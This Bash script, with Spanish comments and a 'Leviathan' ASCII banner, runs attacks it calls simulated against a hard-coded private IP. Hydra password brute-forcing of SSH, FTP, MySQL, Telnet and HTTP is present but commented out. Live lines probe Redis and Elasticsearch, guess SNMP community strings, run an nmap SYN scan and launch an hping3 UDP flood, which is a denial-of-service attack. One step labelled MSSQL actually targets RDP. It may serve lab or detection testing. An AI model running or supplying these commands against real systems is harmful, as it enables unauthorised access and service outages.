#!/bin/bash

# Colores
RED='\033[1;31m'
PURPLE='\033[1;35m'
YELLOW='\033[1;33m'
NC='\033[0m'

TARGET="172.16.31.58"  # Cambia aquí el objetivo

cols=$(tput cols)

center() {
    while IFS= read -r line; do
        padding=$(( (cols - ${#line}) / 2 ))
        printf "%*s%s\n" "$padding" "" "$line"
    done
}

clear

# Logo Leviathan en rojo fuego
cat << "EOF" | while IFS= read -r line; do echo -e "${RED}$(printf '%*s%s' $(( (cols - ${#line}) / 2 )) '' "$line")${NC}"; done
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
EOF

# Texto Leviathan en morado
cat << "EOF" | while IFS= read -r line; do echo -e "${PURPLE}$(printf '%*s%s' $(( (cols - ${#line}) / 2 )) '' "$line")${NC}"; done
 **       ******** **      ** **     **     ********** **      **     **     ****     **
/**      /**///// /**     /**/**    ****   /////**/// /**     /**    ****   /**/**   /**
/**      /**      /**     /**/**   **//**      /**    /**     /**   **//**  /**//**  /**
/**      /******* //**    ** /**  **  //**     /**    /**********  **  //** /** //** /**
/**      /**////   //**  **  /** **********    /**    /**//////** **********/**  //**/**
/**      /**        //****   /**/**//////**    /**    /**     /**/**//////**/**   //****
/********/********   //**    /**/**     /**    /**    /**     /**/**     /**/**    //***
//////// ////////     //     // //      //     //     //      // //      // //      ///
EOF

echo -e "${NC}"

sleep 2

echo -e "${YELLOW}🔥 Iniciando ataques simulados de fuerza bruta contra $TARGET ...${NC}"

# Ataques simulados en paralelo para no bloquear el script
(
  echo "[+] SSH bruteforce..."
  # hydra -t 4 -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://$TARGET

  echo "[+] FTP..."
  # hydra -t 4 -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt ftp://$TARGET

  echo "[+] MySQL..."
  # hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt mysql://$TARGET

  echo "[+] Telnet..."
  # hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt telnet://$TARGET

  echo "[+] Redis..."
  echo -e "\n\n*1\r\n$4\r\nINFO\r\n" | nc $TARGET 6379

  echo "[+] ElasticSearch query..."
  curl -s "http://$TARGET:9200/_cat/indices?v"

  echo "[+] MSSQL..."
  # ncrack -vv --user sa -P /usr/share/wordlists/rockyou.txt rdp://$TARGET

  echo "[+] HTTP form bruteforce..."
  # hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt $TARGET http-get /

  echo "[+] SNMP public strings..."
  ones="public private admin root test"
  for c in $ones; do
    snmpwalk -c "$c" -v1 $TARGET system 2>/dev/null
  done

  echo "[✓] Ataques finalizados."
) &

# Ataques básicos para generar tráfico
echo "Simulando ataque: escaneo SYN rápido a $TARGET"
nmap -sS -T4 $TARGET

echo "Simulando ataque: UDP flood a $TARGET puerto 53"
sudo hping3 --flood --udp -p 53 $TARGET
